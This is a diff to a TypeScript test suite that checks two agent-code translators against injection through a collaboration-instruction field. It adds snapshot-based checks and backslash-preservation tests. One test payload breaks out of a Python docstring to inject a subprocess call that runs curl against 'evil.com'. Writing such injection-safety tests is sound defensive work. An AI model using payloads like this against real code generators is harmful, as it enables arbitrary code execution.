@@ -192,9 +192,14 @@ function makeCollaboratorConfig(collaborationInstruction: string): BedrockAgentC
   });
 }
 
+function extractToolFunction(mainPyContent: string): string {
+  const start = mainPyContent.indexOf('@tool');
+  const end = mainPyContent.indexOf('\n\n\n', start);
+  return mainPyContent.slice(start, end);
+}
+
 describe('StrandsTranslator - collaborationInstruction injection safety', () => {
   it('neutralizes triple-quote injection in collaborationInstruction', () => {
-    // Payload attempts to break out of the """...""" docstring to inject executable code
     const payload = '"""\nimport subprocess; subprocess.run(["curl","evil.com"])\n"""';
     const config = makeCollaboratorConfig(payload);
     const translator = new StrandsTranslator(config, {
@@ -204,10 +209,20 @@ describe('StrandsTranslator - collaborationInstruction injection safety', () => 
       enableObservability: false,
     });
     const { mainPyContent } = translator.translate();
-    // The """ must be escaped to \"\"\" — confirming the docstring is not broken out of
-    expect(mainPyContent).toContain('\\"\\"\\"');
-    // No bare """ should appear inside the tool docstring
-    expect(mainPyContent).not.toMatch(/""".*"""\s*"""/s);
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+
+  it('preserves backslashes in collaborationInstruction without doubling', () => {
+    const payload = 'C:\\path\\to\\file and regex \\d+';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new StrandsTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
   });
 });
 
@@ -222,8 +237,20 @@ describe('LangGraphTranslator - collaborationInstruction injection safety', () =
       enableObservability: false,
     });
     const { mainPyContent } = translator.translate();
-    expect(mainPyContent).toContain('\\"\\"\\"');
-    expect(mainPyContent).not.toMatch(/""".*"""\s*"""/s);
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
+  });
+
+  it('preserves backslashes in collaborationInstruction without doubling', () => {
+    const payload = 'C:\\path\\to\\file and regex \\d+';
+    const config = makeCollaboratorConfig(payload);
+    const translator = new LangGraphTranslator(config, {
+      agentConfig: config,
+      enableMemory: false,
+      memoryOption: 'none',
+      enableObservability: false,
+    });
+    const { mainPyContent } = translator.translate();
+    expect(extractToolFunction(mainPyContent)).toMatchSnapshot();
   });
 });
 
